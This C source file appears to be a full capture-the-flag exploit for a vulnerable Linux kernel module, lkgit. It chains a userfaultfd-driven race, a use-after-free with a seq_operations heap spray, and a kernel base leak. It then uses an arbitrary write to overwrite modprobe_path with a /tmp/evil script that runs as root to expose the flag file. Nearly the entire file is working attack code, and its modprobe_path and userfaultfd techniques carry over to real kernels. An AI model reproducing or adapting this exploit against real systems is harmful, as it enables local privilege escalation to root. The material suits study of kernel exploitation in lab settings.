/****************
 *
 * Full exploit of lkgit.
 * 
****************/

#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <netinet/in.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>

#include "../src/include/lkgit.h"// commands

#define DEV_PATH "/dev/lkgit"   // the path the device is placed
#define ulong unsigned long
#define scu static const unsigned long

#// constants
#define PAGE 0x1000
#define NO_FAULT_ADDR 0xdead0000
#define FAULT_ADDR    0xdead1000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
int uffd;
struct uffdio_api uffdio_api;
struct uffdio_register uffdio_register;
int lkgit_fd;
char buf[0x400];
unsigned long len = 2 * PAGE;
void *addr = (void*)NO_FAULT_ADDR;
void *target_addr;
size_t target_len;
int tmpfd[0x300];
int seqfd;
struct sockaddr_in saddr = {0};
struct msghdr socketmsg = {0};
struct iovec iov[1];

ulong single_start;
ulong kernbase;

ulong off_single_start = 0x01adc20;
ulong off_modprobepath = 0x0c3cb20;
// (END globals)


// utils
#define WAIT getc(stdin);
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
ulong user_cs,user_ss,user_sp,user_rflags;

/** module specific utils **/

char* hash_to_string(char *hash) {
  char *hash_str = calloc(HASH_SIZE * 2 + 1, 1);
  for(int ix = 0; ix != HASH_SIZE; ++ix) {
    sprintf(hash_str + ix*2, "%02lx", (unsigned long)(unsigned char)hash[ix]);
  }
  return hash_str;
}

char* string_to_hash(char *hash_str) {
  char *hash = calloc(HASH_SIZE, 1);
  char buf[3] = {0};
  for(int ix = 0; ix != HASH_SIZE; ++ix) {
    memcpy(buf, &hash_str[ix*2], 2);
    hash[ix] = (char)strtol(buf, NULL, 16);
  }
  return hash;
}

void print_log(log_object *log) {
  printf("HASH   : %s\n", hash_to_string(log->hash));
  printf("MESSAGE: %s\n", log->message);
  printf("CONTENT: \n%s\n", log->content);
}
/** END of module specific utils **/


void *conflict_during_fault(char *content) {
  // commit with conflict of hash
  char content_buf[FILE_MAXSZ] = {0};
  char msg_buf[MESSAGE_MAXSZ] = {0};
  memcpy(content_buf, content, FILE_MAXSZ); // hash became 00000000000...
  hash_object req = {
      .content = content_buf,
      .message = content_buf,
  };
  printf("[.] committing with conflict...: %s\n", content);
  assert(ioctl(lkgit_fd, LKGIT_HASH_OBJECT, &req) == 0);
  printf("[+] hash: %s\n", hash_to_string(req.hash));
}

// userfaultfd-utils
static void* fault_handler_thread(void *arg)
{
  puts("[+] entered fault_handler_thread");

  static struct uffd_msg msg;   // data read from userfaultfd
  //struct uffdio_copy uffdio_copy;
  struct uffdio_range uffdio_range;
  struct uffdio_copy uffdio_copy;
  long uffd = (long)arg;        // userfaultfd file descriptor
  struct pollfd pollfd;         //
  int nready;                   // number of polled events

  // set poll information
  pollfd.fd = uffd;
  pollfd.events = POLLIN;

  // wait for poll
  puts("[+] polling...");
  while(poll(&pollfd, 1, -1) > 0){
    if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
      errExit("poll");

    // read an event
    if(read(uffd, &msg, sizeof(msg)) == 0)
      errExit("read");

    if(msg.event != UFFD_EVENT_PAGEFAULT)
      errExit("unexpected pagefault");

    printf("[!] page fault: %p\n", (void*)msg.arg.pagefault.address);

    // Now, another thread is halting. Do my business.
    char content_buf[FILE_MAXSZ] = {0};
    if (target_addr == (void*)NO_FAULT_ADDR) {
      puts("[+] first: seq_operations");
      memset(content_buf, 'A', FILE_MAXSZ);
      conflict_during_fault(content_buf);
      puts("[+] trying to realloc kfreed object...");
      if ((seqfd = open("/proc/self/stat", O_RDONLY)) <= 0) {
        errExit("open seq_operations");
      }

      // trash
      uffdio_range.start = msg.arg.pagefault.address & ~(PAGE - 1);
      uffdio_range.len = PAGE;
      if(ioctl(uffd, UFFDIO_UNREGISTER, &uffdio_range) == -1)
        errExit("ioctl-UFFDIO_UNREGISTER");
    } else {
      printf("[+] target == modprobe_path @ %p\n", (void*)kernbase + off_modprobepath);
      strcpy(content_buf, "/tmp/evil\x00");
      conflict_during_fault(content_buf);

      puts("[+] trying to realloc kfreed object...");
      long *buf = calloc(sizeof(long), sizeof(hash_object) / sizeof(long));
      for (int ix = 0; ix != sizeof(hash_object) / sizeof(long); ++ix) {
        buf[ix] = kernbase + off_modprobepath;
      }

      char content_buf[FILE_MAXSZ] = {0};
      char hash_buf[HASH_SIZE] = {0};
      strcpy(content_buf, "uouo-fish-life\x00");
      hash_object req = {
          .content = content_buf,
          .message = (char*)buf,
      };
      assert(ioctl(lkgit_fd, LKGIT_HASH_OBJECT, &req) == 0);
      printf("[+] hash: %s\n", hash_to_string(req.hash));

      // write evil message
      puts("[+] copying evil message...");
      char message_buf[PAGE] = {0};
      strcpy(message_buf, "/tmp/evil\x00");
      uffdio_copy.src = (unsigned long)message_buf;
      uffdio_copy.dst = msg.arg.pagefault.address;
      uffdio_copy.len = PAGE;
      uffdio_copy.mode = 0;
      if(ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
        errExit("ioctl-UFFDIO_COPY");
    }

    break;
  }

  puts("[+] exiting fault_handler_thrd");
}

void register_userfaultfd_and_halt(void)
{
  puts("[+] registering userfaultfd...");

  long uffd;      // userfaultfd file descriptor
  pthread_t thr;  // ID of thread that handles page fault and continue exploit in another kernel thread
  struct uffdio_api uffdio_api;
  struct uffdio_register uffdio_register;
  int s;

  // create userfaultfd file descriptor
  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); // there is no wrapper in libc
  if(uffd == -1)
    errExit("userfaultfd");

  // enable uffd object via ioctl(UFFDIO_API)
  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  if(ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
    errExit("ioctl-UFFDIO_API");

  // mmap
  addr = mmap(target_addr, target_len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0); // set MAP_FIXED for memory to be mmaped on exactly specified addr.
  printf("[+] mmapped @ %p\n", addr);
  if(addr == MAP_FAILED || addr != target_addr)
    errExit("mmap");

  // specify memory region handled by userfaultfd via ioctl(UFFDIO_REGISTER)
  // first step
  if (target_addr == (void*)NO_FAULT_ADDR) {
    uffdio_register.range.start = (size_t)(target_addr + PAGE);
    uffdio_register.range.len = PAGE;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  } else {
    // second step
    uffdio_register.range.start = (size_t)(target_addr + PAGE);
    uffdio_register.range.len = PAGE;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  }
  //uffdio_register.mode = UFFDIO_REGISTER_MODE_WP; // write-protection
  if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
    errExit("ioctl-UFFDIO_REGISTER");

  s = pthread_create(&thr, NULL, fault_handler_thread, (void*)uffd);
  if(s!=0){
    errno = s;
    errExit("pthread_create");
  }

  puts("[+] registered userfaultfd");
}
// (END userfaultfd-utils)


int main(int argc, char *argv[])
{
  puts("[.] starting exploit...");
  system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/nirugiri");
  system("echo -ne '#!/bin/sh\nchmod 777 /home/user/flag && cat /home/user/flag' > /tmp/evil");
  system("chmod +x /tmp/evil");
  system("chmod +x /tmp/nirugiri");


  lkgit_fd = open(DEV_PATH, O_RDWR);
	if(lkgit_fd < 0) {
		errExit("open");
	}

  // register uffd handler
  target_addr = (void*)NO_FAULT_ADDR;
  target_len = 2 * PAGE;
  register_userfaultfd_and_halt();
  sleep(1);

  log_object *log = (log_object*)(target_addr + PAGE - (HASH_SIZE + FILE_MAXSZ));
  printf("[.] target addr: %p\n", target_addr);
  printf("[.] log:         %p\n", log);

  // spray
  puts("[.] heap spraying...");
  for (int ix = 0; ix != 0x90; ++ix) {
    tmpfd[ix] = open("/proc/self/stat", O_RDONLY);
  }

  // commit a file normaly
  char content_buf[FILE_MAXSZ] = {0};
  char msg_buf[MESSAGE_MAXSZ] = {0};
  char hash_buf[HASH_SIZE] = {0};
  memset(content_buf, 'A', FILE_MAXSZ); // hash became 00000000000...
  strcpy(msg_buf, "This is normal commit.\x00");
  hash_object req = {
      .content = content_buf,
      .message = msg_buf,
  };
  assert(ioctl(lkgit_fd, LKGIT_HASH_OBJECT, &req) == 0);
  printf("[+] hash: %s\n", hash_to_string(req.hash));

  memset(content_buf, 0, FILE_MAXSZ);
  strcpy(content_buf, "/tmp/evil\x00"); // hash is 46556c00000000000000000000000000
  strcpy(msg_buf, "This is second commit.\x00");
  assert(ioctl(lkgit_fd, LKGIT_HASH_OBJECT, &req) == 0);
  printf("[+] hash: %s\n", hash_to_string(req.hash));


  // try to get a log and invoke race
  // this fault happens when copy_to_user(to = message), not when copy_to_user(to = content).
  memset(log->hash, 0, HASH_SIZE);
  assert(ioctl(lkgit_fd, LKGIT_GET_OBJECT, log) == 0);
  print_log(log);

  // kernbase leak
  single_start = *(unsigned long*)log->hash;
  kernbase = single_start - off_single_start;
  printf("[!] single_start: %lx\n", single_start);
  printf("[!] kernbase: %lx\n", kernbase);

  // prepare for race again.
  target_len = PAGE * 2;
  target_addr = (void*)NO_FAULT_ADDR + PAGE*2;
  register_userfaultfd_and_halt();
  sleep(1);

  // amend to race/AAW
  log = (log_object *)(target_addr + PAGE - (HASH_SIZE + FILE_MAXSZ));
  memcpy(log->hash, string_to_hash("46556c00000000000000000000000000"), HASH_SIZE); // hash is 46556c00000000000000000000000000
  puts("[.] trying to race to achive AAW...");
  int e = ioctl(lkgit_fd, LKGIT_AMEND_MESSAGE, log);
  if (e != 0) {
    if (e == -LKGIT_ERR_OBJECT_NOTFOUND) {
      printf("[ERROR] object not found: %s\n", hash_to_string(log->hash));
    } else {
      printf("[ERROR] unknown error in AMEND.\n");
    }
  }
 
  // nirugiri
  puts("[!] executing evil script...");
  system("/tmp/nirugiri");
  system("cat /home/user/flag");

  printf("[.] end of exploit.\n");
  return 0;
}